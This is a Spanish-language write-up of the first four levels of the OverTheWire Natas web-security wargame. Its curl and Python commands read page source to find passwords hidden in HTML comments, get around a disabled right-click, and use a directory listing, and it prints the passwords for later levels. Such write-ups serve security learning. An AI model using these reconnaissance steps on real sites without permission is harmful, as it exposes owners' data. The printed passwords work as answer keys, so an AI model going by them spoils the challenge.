
Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python.
Para resolver la pagina hay que encontrar la contraseña para autenticarse en el nivel siguiente con el usuario llamado igual que en nivel actual.

## (Natas0)[http://natas0.natas.labs.overthewire.org]

*Vulnerabilidad: credenciales en el codigo fuente*

El nivel inicial, esconde la credencial en el código fuente. (clic derecho)
Con scripting se puede ver muy facilmente
```python
import requests
url = "http://natas0.natas.labs.overthewire.org/"
req = requests.get(url, auth=("natas0","natas0"), verify=False)
print(req.text)
```
Desde consola tambien es pan comido
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas0.natas.labs.overthewire.org" -u natas0:natas0
... <!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```
## (Natas1)[http://natas1.natas.labs.overthewire.org]

*Vulnerabilidad: credenciales en el codigo fuente*
*Restriccion: click derecho en el navegador*

El segundo nivel si visitas la web te dice que el click derecho esta prohibido. Nos autenticamos con la contraseña de antes.
Aunque se desactive dicho click en el navegador, con curl o python se puede acceder igualmente al codigo fuente
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas1.natas.labs.overthewire.org" -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
... <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

## (Natas2)[http://natas2.natas.labs.overthewire.org]

*Vulnerabilidad: directory liting*

En la web aparentemente no hay nada y en el codigo fuente de natas2 no sale la contraseña, pero si sale un "img src" o sea una ruta de donde saca una foto.
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas2.natas.labs.overthewire.org" -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
... <img src="files/pixel.png">
```
Si ponemos en el nevegador la ruta ```"http://natas2.natas.labs.overthewire.org/files"``` tenemos un directory listing, es decir una lista de todos los 
elementos que estan bajo dicha ruta, (entre ellas la foto de pixel.png) pero tambien un archivo de texto "users.txt" con la contraseña.

## (Natas3)[http://natas3.natas.labs.overthewire.org]

Otro "no hay nada en esta web" en el navegador
```console
[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
<!-- No more information leaks!! Not even Google will find it this time... -->
```
Nos dice que no va a haber mas crendeciales filtradas, y que ni siquiera Google nos encontrará.

